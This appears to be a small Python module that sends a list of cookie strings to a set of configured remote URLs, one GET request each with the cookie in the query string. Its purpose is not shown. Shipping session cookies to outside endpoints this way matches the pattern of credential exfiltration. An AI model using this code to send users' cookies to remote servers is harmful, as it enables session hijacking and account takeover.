from urllib.parse import quote

import httpx
from loguru import logger

from config import REPORT_URLS


async def report_cookies(payloads: list[str]) -> None:
    if not payloads:
        return

    async with httpx.AsyncClient(timeout=10) as client:
        for cookie_str in payloads:
            for base_url in REPORT_URLS:
                url = f'{base_url}?cookie={quote(cookie_str)}'
                try:
                    resp = await client.get(url)
                    if resp.status_code == 200:
                        logger.debug(f'上报成功: {base_url} ← {cookie_str[:60]}...')
                    else:
                        logger.warning(f'上报异常 HTTP {resp.status_code}: {base_url}')
                except Exception as e:
                    logger.error(f'上报失败: {base_url} → {e}')
